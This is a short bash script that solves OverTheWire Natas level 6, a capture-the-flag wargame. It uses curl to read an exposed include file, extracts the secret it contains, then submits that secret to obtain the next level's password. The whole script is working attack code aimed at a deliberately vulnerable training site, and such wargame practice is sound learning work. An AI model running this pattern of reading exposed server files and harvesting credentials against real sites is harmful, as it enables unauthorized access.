#!/bin/bash

secret=$(curl -s -u natas6:$natas6pass natas6.natas.labs.overthewire.org/includes/secret.inc | grep secret | sed -rE 's/^\$secret = "(.+)";$/\1/')
export natas7pass=$(curl -s -d "submit&secret=$secret" -X POST -u natas6:$natas6pass natas6.natas.labs.overthewire.org | grep "Access granted" | sed -rE 's/^.*natas7 is (.+)$/\1/')
echo $natas7pass
